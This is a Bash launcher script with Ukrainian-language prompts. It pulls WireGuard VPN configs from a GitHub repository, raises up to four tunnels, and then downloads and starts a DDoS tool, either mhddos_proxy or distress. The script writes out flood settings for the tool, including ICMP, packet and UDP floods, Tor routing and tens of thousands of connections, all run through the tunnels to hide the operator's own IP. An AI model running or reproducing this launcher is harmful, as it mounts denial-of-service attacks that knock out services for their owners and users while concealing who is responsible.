#!/bin/bash
set -e

# === Кольори ===
print_header() {
    echo -e "\e[1;36m========================================"
    echo -e "🚀  Kaljan747 — Повний запуск"
    echo -e "========================================\e[0m"
}

print_stage() {
    echo -e "\e[1;34m$1\e[0m"
}

print_summary() {
    echo -e "\n\e[1;33m----------------------------------------"
    echo -e "📦  Залежності: \e[1;32mOK\e[0m"
    echo -e "🌍  WG-тунелі: \e[1;32mOK\e[0m"
    echo -e "⚙️  Модуль: $1 | PID: $2"
    echo -e "----------------------------------------\e[0m"
}

# === Шляхи ===
WG_REPO_RAW="https://raw.githubusercontent.com/k7771/Kaljan747/k7771/wg"
WG_REPO_HTML="https://github.com/k7771/Kaljan747/tree/k7771/wg"
WG_DIR="$HOME/wg_confs"
LOG_DIR="$HOME/logs"
MODULE_DIR="$HOME/modules"
SETTINGS_FILE="$HOME/.kaljan747_settings"
LOG_FILE="$LOG_DIR/wg.log"

mkdir -p "$WG_DIR" "$LOG_DIR" "$MODULE_DIR"
touch "$LOG_FILE"

SUDO=$(command -v sudo || echo "")

# === USER-ID ===
ask_user_id() {
    read -p "Введіть ваш USER-ID (тільки цифри): " USER_ID
    [[ "$USER_ID" =~ ^[0-9]+$ ]] || { echo "❌ USER-ID недійсний"; exit 1; }
}

# === Вибір модуля ===
ask_parameters() {
    echo "Виберіть модуль:"
    echo "1) mhddos_proxy"
    echo "2) distress"
    read -p "Ваш вибір (1/2): " mod_choice
    MODULE=$( [ "$mod_choice" = "1" ] && echo "mhddos_proxy" || echo "distress" )

    echo "Редагувати INI перед запуском?"
    echo "1) Так"
    echo "2) Ні"
    read -p "Ваш вибір (1/2): " edit_choice
    EDIT_INI=$( [ "$edit_choice" = "1" ] && echo "Так" || echo "Ні" )

    echo "Режим запуску:"
    echo "1) screen у фоні"
    echo "2) screen відкрито"
    echo "3) без screen"
    read -p "Ваш вибір (1/2/3): " run_choice
    case "$run_choice" in
        1) RUN_MODE="screen у фоні";;
        2) RUN_MODE="screen відкрито";;
        3) RUN_MODE="без screen";;
    esac
}

print_header

# === Завантаження WG-конфігів ===
print_stage "🌍 Завантаження WG-конфігів з GitHub"
rm -f "$WG_DIR"/*.conf

ALL_CONF_URLS=$(curl -s "$WG_REPO_HTML" | grep -oP 'href="\K/k7771/Kaljan747/blob/k7771/wg/[^"?]*\.conf' | sed 's|^|https://raw.githubusercontent.com|;s|/blob|/|')

for url in $ALL_CONF_URLS; do
  filename=$(basename "$url")
  dest="$WG_DIR/$filename"
  curl -fsSL "$url" -o "$dest" && echo "[+] $filename" || echo "[-] $filename"
  chmod 600 "$dest"
done

# === Зупинка активних WG ===
print_stage "🔻 Зупинка активних WG"
for iface in $(wg show interfaces 2>/dev/null); do
  echo "[-] Зупиняю: $iface" | tee -a "$LOG_FILE"
  $SUDO wg-quick down "$iface" 2>/dev/null || true
  $SUDO ip link delete "$iface" 2>/dev/null || true
done

# === Підняття до 4-х працюючих WG ===
check_wg_connection() {
  curl -s --interface "$1" --max-time 5 https://api.ipify.org >/dev/null
}

WG_FILES=( $(find "$WG_DIR" -type f -name "*.conf" | shuf) )
WG_IFACES=()
INDEX=0

print_stage "📡 Підключення WG..."
while [ "${#WG_IFACES[@]}" -lt 4 ] && [ "$INDEX" -lt "${#WG_FILES[@]}" ]; do
  conf="${WG_FILES[$INDEX]}"
  IFACE_NAME=$(basename "$conf" .conf)
  $SUDO wg-quick up "$conf" 2>/dev/null || true
  sleep 2

  if check_wg_connection "$IFACE_NAME"; then
    echo "✅ $IFACE_NAME" | tee -a "$LOG_FILE"
    WG_IFACES+=("$IFACE_NAME")
  else
    echo "❌ $IFACE_NAME" | tee -a "$LOG_FILE"
    $SUDO wg-quick down "$IFACE_NAME" 2>/dev/null || true
    $SUDO ip link delete "$IFACE_NAME" 2>/dev/null || true
  fi
  INDEX=$((INDEX+1))
done

[ "${#WG_IFACES[@]}" -eq 0 ] && { echo "❌ Жоден тунель не працює"; exit 1; }

VPN_LIST=$(IFS=' '; echo "${WG_IFACES[*]}")
VPN_LIST_COMMAS=$(IFS=','; echo "${WG_IFACES[*]}")
echo "[✓] Активні інтерфейси: $VPN_LIST"

# === USER ID + Параметри ===
ask_user_id
ask_parameters

# === Завантаження модуля та генерація INI ===
print_stage "⬇️ Завантаження модуля $MODULE"
if [ "$MODULE" = "mhddos_proxy" ]; then
  MODULE_BIN="$MODULE_DIR/mhddos_proxy"
  CONFIG_FILE="$MODULE_DIR/mhddos.ini"
  LINK="https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux"
  echo "--use-my-ip 0 --copies 4 -t 12000 --ifaces $VPN_LIST --user-id=$USER_ID" > "$CONFIG_FILE"
else
  MODULE_BIN="$MODULE_DIR/distress"
  CONFIG_FILE="$MODULE_DIR/distress.ini"
  LINK="https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl"
  echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000 --interface=$VPN_LIST_COMMAS --user-id=$USER_ID" > "$CONFIG_FILE"
fi

[ -f "$MODULE_BIN" ] || curl -fsSL "$LINK" -o "$MODULE_BIN"
chmod +x "$MODULE_BIN"

# === Редагування INI ===
[ "$EDIT_INI" = "Так" ] && nano "$CONFIG_FILE"

# === Запуск ===
print_stage "🚀 Запуск модуля..."
ARGS=$(cat "$CONFIG_FILE")
if [ "$RUN_MODE" = "screen у фоні" ]; then
  screen -dmS "$MODULE" bash -c "$MODULE_BIN $ARGS"
elif [ "$RUN_MODE" = "screen відкрито" ]; then
  screen -S "$MODULE" bash -c "$MODULE_BIN $ARGS"
else
  bash -c "$MODULE_BIN $ARGS" &
fi

PID=$(pgrep -f "$MODULE_BIN")
print_summary "$MODULE" "$PID"
